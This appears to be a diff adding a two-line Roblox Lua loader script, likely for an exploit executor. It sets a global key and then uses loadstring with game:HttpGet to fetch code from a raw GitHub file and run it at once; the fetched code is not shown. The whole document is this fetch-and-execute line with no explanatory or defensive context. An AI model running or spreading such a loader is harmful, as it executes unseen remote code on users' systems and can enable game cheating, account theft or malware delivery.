@@ -1,0 +1,2 @@
+getgenv().LS="k1s"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/llkj/main/ljj.txt"))()
